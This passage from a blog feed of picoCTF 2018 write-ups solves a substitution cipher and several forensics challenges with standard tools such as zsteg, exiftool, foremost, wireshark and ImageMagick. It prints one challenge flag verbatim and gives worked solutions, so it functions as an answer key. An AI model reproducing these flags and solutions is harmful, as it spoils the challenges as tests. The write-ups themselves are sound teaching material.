file <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;hertz.txt&#34;</span>, <span style="color:#f1fa8c">&#34;r&#34;</span>)
ctext <span style="color:#ff79c6">=</span> file<span style="color:#ff79c6">.</span>read()

cleartext <span style="color:#ff79c6">=</span> ctext<span style="color:#ff79c6">.</span>translate(string<span style="color:#ff79c6">.</span>maketrans(best_key, alphabet))

<span style="color:#8be9fd;font-style:italic">print</span> (cleartext)
</code></pre></td></tr></table>
</div>
</div><p>The quick brown fox jumps over the lazy dog. I can&rsquo;t believe this is such an easy problem in Pico. It&rsquo;s almost as if I solved a problem already! Okay, fine. Here&rsquo;s the flag: picoCTF{substitution_ciphers_are_too_easy_dngaowmvye}</p>
<h2 id="safe-rsa">Safe RSA</h2>
]]></content></item><item><title>picoCTF 2018 - Forensics</title><link>https://0xade1.github.io/posts/2019/12/picoctf-2018-forensics/</link><pubDate>Thu, 19 Dec 2019 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2019/12/picoctf-2018-forensics/</guid><description>forensics-warmup-001 We download a zipfile with the command curl -Ok url. The -k switch allows to by-pass ssl certificates checking when downloading a file in TLS (with https). we first check the zipfile with the command file: it&amp;rsquo;s indeed effectively a zip so we can unzip and explore the content. Apparently there is an image, we open it with eog and we can observe the flag
1 2 3 4 curl -Ok https://&amp;lt;URL&amp;gt;/flag.</description><content type="html"><![CDATA[<h2 id="forensics-warmup-001">forensics-warmup-001</h2>
<p>We download a zipfile with the command <code>curl -Ok url</code>. The <code>-k</code> switch allows to by-pass ssl certificates checking when downloading a file in TLS (with https).
we first check the zipfile with the command <code>file</code>: it&rsquo;s indeed effectively a zip so we can unzip and explore the content.
Apparently there is an image, we open it with <code>eog</code> and we can observe the flag</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -Ok https://&lt;URL&gt;/flag.zip
file flag.zip
unzip flag.zip
eog flag.png
</code></pre></td></tr></table>
</div>
</div><h2 id="forensics-warmup-002">forensics-warmup-002</h2>
<p>We download a png file that we are not able to open with the command <code>eog</code>. There is obviously soething wrong about this file that requires us to investigate with forensics tool. We first do some reconnaissance on the file itself with the command <code>file</code> which informs us that the fyle type is not a png but a jepg file. Simply changing the extension to jpg solves our problem.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">file flag.png
mv flag.png flag.png.jpg
eog flag.png.jpg
</code></pre></td></tr></table>
</div>
</div><h2 id="desrouleaux">desrouleaux</h2>
<p>The user connect with netcat <code>nc</code> on a remote shell and is then prompted to answer a set of multiple questions with a time constraint. Once the user has answered all the questions correctly, he obtains the flag; however upon wrong answer or timeout, he is being kicked-out of the shell and has to re-iterate the process.</p>
<p>All 4 questions are based on the exploration of a json file <code>cat incidents.json</code>
My first approach was to script all the answer, but then I realise that questions are sometime changing, and therefore make it a bit more tricky to copy-paste valid answer.</p>
<p>While I could have scripted using regex extraction, I chose instead a second approach that leverages the command <code>jq</code> followed by copy-paste:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">jq <span style="color:#f1fa8c">&#39;.tickets[].src_ip&#39;</span> incidents.json | sort -r | uniq -c
      <span style="color:#bd93f9">4</span> <span style="color:#f1fa8c">&#34;251.165.34.242&#34;</span>
      <span style="color:#bd93f9">4</span> <span style="color:#f1fa8c">&#34;246.69.53.233&#34;</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;231.205.245.44&#34;</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;215.239.98.18&#34;</span>


jq <span style="color:#f1fa8c">&#39;.tickets[] | select (..| .src_ip? == &#34;215.239.98.18&#34;).dst_ip&#39;</span> incidents.json
<span style="color:#f1fa8c">&#34;231.12.49.241&#34;</span>

jq  <span style="color:#f1fa8c">&#39;.tickets[] | .file_hash + &#34; &#34; + .dst_ip&#39;</span> incidents.json | sort -r | uniq -c
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;f2d2c758fe8853b5 164.217.208.88&#34;</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;8aa16b403ac7de3e 231.12.49.241&#34;</span>
      <span style="color:#bd93f9">3</span> <span style="color:#f1fa8c">&#34;8aa16b403ac7de3e 168.138.219.19&#34;</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;6629fde09ed2dab7 187.229.175.225&#34;</span>
      <span style="color:#bd93f9">2</span> <span style="color:#f1fa8c">&#34;581dc312cc8c16c6 48.173.183.246&#34;</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;33d81fec987b8a8c 48.173.183.246&#34;</span>
      <span style="color:#bd93f9">1</span> <span style="color:#f1fa8c">&#34;33d81fec987b8a8c 125.130.154.106&#34;</span>

python -c <span style="color:#f1fa8c">&#39;print 7.0 / 5&#39;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="reading-between-the-eyes">reading-between-the-eyes</h2>
<p><img src="./resources/reading-between-the-eyes/husky.png" alt="husky.png"></p>
<ul>
<li><a href="./resources/reading-between-the-eyes/husky.png">husky.png</a></li>
<li><a href="https://github.com/zed-0xff/zsteg.git">zsteg</a> github repo</li>
</ul>
<p>We download a beautiful husky picture but the flag is hidden somewhere in this image so we have to leverage some forensics tools.</p>
<p>We assume this is a steganography challenge, so we first try to solve this challenge by simply leveraging <code>zsteg</code> command. This command tries basic and common steganography algorithm for us:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">zsteg husky.png | grep picoCTF | cut -d <span style="color:#f1fa8c">&#39;&#34;&#39;</span> -f2
</code></pre></td></tr></table>
</div>
</div><h2 id="recovering-from-the-snap">recovering-from-the-snap</h2>
<p>we download a block device dump file <code>animals.dd</code>. We create a folder to mount the file</p>
<pre tabindex="0"><code>mkdir mnt; mount animals.dd mnt; ls mnt
</code></pre><p>It contains several images but none of them contains an obvious flag.</p>
<p>Before we investigate each image independently, we want to look whether some images have been deleted from the block device
because we know that following the <code>rm</code> command, files are still recoverable unless the disk allocated space has been over-written.
We use <code>foremost animals.dd</code>, and indeed a folder <code>output/jpg/</code> is created and contains deleted images we could recover.
One of the recovered image contains the flag.</p>
<h2 id="admin-panel">admin-panel</h2>
<ul>
<li><a href="./resources/admin-panel/data.pcap">data.pcap</a></li>
</ul>
<p>We download a network packet capture file <a href="./resources/admin-panel/data.pcap">data.pcap</a> which we can open using <code>wireshark</code>. From wireshark, we observe couple of <code>HTTP POST /login</code> requests. We simply leverages the wireshark &ldquo;Follow tcp stream&rdquo; on the second POST /login to observe the login password which actually is the flag</p>
<h2 id="hex-editor">hex-editor</h2>
<p><img src="./resources/hex-editor/hex_editor.jpg" alt="hex_editor.jpg"></p>
<ul>
<li><a href="./resources/hex-editor/hex_editor.jpg">hex_editor.jpg</a></li>
</ul>
<p>We download a cat image that hides a flag. The hint is to used a command such as <code>xxd hexedit bvi</code>. Why a cat image? porbably another hint to pipe a cat command with xxd &hellip; Indeed, the flag is right at the end.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat hex_editor.jpg | xxd
</code></pre></td></tr></table>
</div>
</div><h2 id="truly-an-artist">truly-an-artist</h2>
<p><img src="./resources/truly-an-artist/2018.png" alt="2018.png"></p>
<ul>
<li><a href="./resources/truly-an-artist/2018.png">2018.png</a></li>
<li><a href="https://github.com/zed-0xff/zsteg.git">zsteg</a></li>
</ul>
<p>We have a download link called &ldquo;Meta material&rdquo; pointing to an image 2018.png which apparently contains a flag. However this is just diversion. The image url name &ldquo;meta-material&rdquo;, makes us suspect we have to look for meta-information embedded in the file instead of the file data itself.</p>
<p>We will use <code>exiftool</code> or <code>zsteg</code> to extract meta-information</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">exiftool 2018.jpg | grep pico
</code></pre></td></tr></table>
</div>
</div><p>Another useful tool is <a href="https://github.com/zed-0xff/zsteg.git">zsteg</a> which can be downloaded from git</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">zsteg 2018.jpg | grep pico
</code></pre></td></tr></table>
</div>
</div><h2 id="now-you-dont">now-you-dont</h2>
<ul>
<li><a href="./resources/now-you-dont/nowYouDont.png">nowYouDont.png</a> &ndash;&gt; This image is apparently filled with plain red, but what the eyes can&rsquo;t see, the computer can.</li>
<li><a href="https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve">stegsolve</a> git repo</li>
</ul>
<p>The hint is:</p>
<pre tabindex="0"><code>Is it really all one shade of red?
</code></pre><p>To tackle this challenge, we figure out <code>stegsolve</code> can help us get the flag lazily.
Another approach is to create a plain monochramatic red image and then substract it from the original image to get the difference.
The result should contain only pixels with a different color shade then the plain monochromatic image.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#6272a4">#Image size is 857x703</span>
exiftool nowYouDont.png

<span style="color:#6272a4">#first pixel color is #912020FF</span>
convert resources/now-you-dont/nowYouDont.png -crop <span style="color:#f1fa8c">&#39;1x1+100+200&#39;</span> txt:-
<span style="color:#6272a4"># ImageMagick pixel enumeration: 1,1,65535,srgba</span>
<span style="color:#6272a4">#0,0: (37265,8224,8224,65535)  #912020FF  srgba(145,32,32,1)</span>

<span style="color:#6272a4">#create an image canva with the unique color above</span>
convert -size 857x703 canvas:<span style="color:#f1fa8c">&#34;#912020&#34;</span> monochrome.png

<span style="color:#6272a4">#substract the canvas color from the original image</span>
compare nowYouDont.png monochrome.png substracted.png

<span style="color:#6272a4">#Now we should see the flag with eog or do simple OCR with tesseract</span>
eog substracted.png
tesseract substracted.png flag.txt
</code></pre></td></tr></table>
</div>
</div><p>Another approach is to use PIL python image library</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">from</span> PIL <span style="color:#ff79c6">import</span> Image, ImageFile
<span style="color:#ff79c6">from</span> pathlib <span style="color:#ff79c6">import</span> Path

imageFile <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;/root/Documents/ctf_writeups/forensics/resources/now-you-dont/nowYouDont.png&#39;</span>
path <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">str</span>(Path(imageFile)<span style="color:#ff79c6">.</span>parents[<span style="color:#bd93f9">0</span>])
basename <span style="color:#ff79c6">=</span> Path(imageFile)<span style="color:#ff79c6">.</span>resolve()<span style="color:#ff79c6">.</span>stem

img <span style="color:#ff79c6">=</span> Image<span style="color:#ff79c6">.</span>open(imageFile)
pixels <span style="color:#ff79c6">=</span> img<span style="color:#ff79c6">.</span>load()

(w,  h) <span style="color:#ff79c6">=</span> img<span style="color:#ff79c6">.</span>size
<span style="color:#8be9fd;font-style:italic">print</span> (w, h)
<span style="color:#8be9fd;font-style:italic">print</span> path <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/&#34;</span> <span style="color:#ff79c6">+</span> basename

<span style="color:#6272a4">#w = 10</span>
<span style="color:#6272a4">#h = 10</span>
colors <span style="color:#ff79c6">=</span> {}

<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, w):
    <span style="color:#ff79c6">for</span> j <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, h):
        (r, g, b, x) <span style="color:#ff79c6">=</span> pixels[i,j]
        key <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#8be9fd;font-style:italic">hex</span>(r))<span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#8be9fd;font-style:italic">hex</span>(g))<span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#8be9fd;font-style:italic">hex</span>(b))
        <span style="color:#ff79c6">if</span> key <span style="color:#ff79c6">not</span> <span style="color:#ff79c6">in</span> colors<span style="color:#ff79c6">.</span>keys():
            colors[key] <span style="color:#ff79c6">=</span> (r, g, b)
            <span style="color:#8be9fd;font-style:italic">print</span> (key, r, g, b)

background <span style="color:#ff79c6">=</span> (<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>)
foreground <span style="color:#ff79c6">=</span> (<span style="color:#bd93f9">255</span>, <span style="color:#bd93f9">255</span>, <span style="color:#bd93f9">255</span>)

<span style="color:#ff79c6">for</span> k <span style="color:#ff79c6">in</span> colors<span style="color:#ff79c6">.</span>keys():
    outimg <span style="color:#ff79c6">=</span> Image<span style="color:#ff79c6">.</span>new(<span style="color:#f1fa8c">&#39;RGB&#39;</span>, (w, h), (<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>))
    outpixels <span style="color:#ff79c6">=</span> outimg<span style="color:#ff79c6">.</span>load()
    <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, w):
        <span style="color:#ff79c6">for</span> j <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">0</span>, h):
            (r, g, b, x) <span style="color:#ff79c6">=</span> pixels[i,j]
            key <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#8be9fd;font-style:italic">hex</span>(r))<span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#8be9fd;font-style:italic">hex</span>(g))<span style="color:#ff79c6">+</span><span style="color:#8be9fd;font-style:italic">str</span>(<span style="color:#8be9fd;font-style:italic">hex</span>(b))
            <span style="color:#ff79c6">if</span> key <span style="color:#ff79c6">==</span> k:
                outpixels[i, j] <span style="color:#ff79c6">=</span> foreground
    outimg<span style="color:#ff79c6">.</span>save(path <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;/&#34;</span> <span style="color:#ff79c6">+</span> basename <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;_&#34;</span> <span style="color:#ff79c6">+</span> k <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#34;.png&#34;</span>)
</code></pre></td></tr></table>
</div>
</div><h2 id="ext-super-magic">ext-super-magic</h2>
<ul>
<li><a href="https://www.garykessler.net/library/file_sigs.html">file_sigs</a>: table of magic header signatures</li>
<li><a href="https://superuser.com/questions/239088/whats-a-file-systems-magic-number-in-a-super-block">resource</a>: EXT2 magic header</li>
</ul>
<p>We download a filesystem image file ext-super-magic.img which appears to be corrupted as the <code>file</code> commande cannot identify the filesystem file:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">file ext-super-magic.img
ext-super-magic.img: data
</code></pre></td></tr></table>
</div>
</div><p>Hints are provided <a href="https://www.garykessler.net/library/file_sigs.html">here</a>: if you are using a Linux/Mac OS X/Unix system, you can use the <code>file</code> command to determine the file type based upon the file signature, per the system&rsquo;s <code>magic</code> file.</p>
<p>Googling &ldquo;ext2 magic number&rdquo;, we found this <a href="https://superuser.com/questions/239088/whats-a-file-systems-magic-number-in-a-super-block">resource</a>:
For example, an ext2/ext3/ext4 filesystem always has the bytes <code>0x53 0xEF</code> at positions <strong>1080–1081</strong>.</p>
<p>So theoretically we just have to patch bytes 1080-1081 with value 0x53EF to have our file being recognized as Ext filesystem</p>
<p>We can use xxd to swiftly patch manually the file:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
